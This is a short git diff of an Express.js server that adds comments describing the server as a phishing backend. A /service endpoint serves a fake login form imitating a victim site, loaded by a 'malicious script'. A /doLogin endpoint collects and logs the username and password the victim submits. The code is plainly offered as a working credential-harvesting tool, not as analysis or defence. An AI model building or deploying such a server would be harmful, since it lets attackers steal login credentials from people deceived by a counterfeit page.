@@ -5,7 +5,10 @@ const bodyParser = require("body-parser");
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cors());
-
+/*
+    Gets called when site is open with the malicious script.
+    This API returns a mock login form similar to victim site. 
+*/
 app.get("/service", (req, res, next)=>{
     let a = `<div class="fl" style="width: 99%;">
 
@@ -50,7 +53,10 @@ app.get("/service", (req, res, next)=>{
 </div>`;
     res.send(a);
 })
-
+/*
+    This API runs when our user inputs his/her username/password in our malicious page.
+    It fetches username and password of our victim.
+*/
 app.post("/doLogin", (req, res, next)=>{
     console.log(req.body);
     res.sendStatus(200);
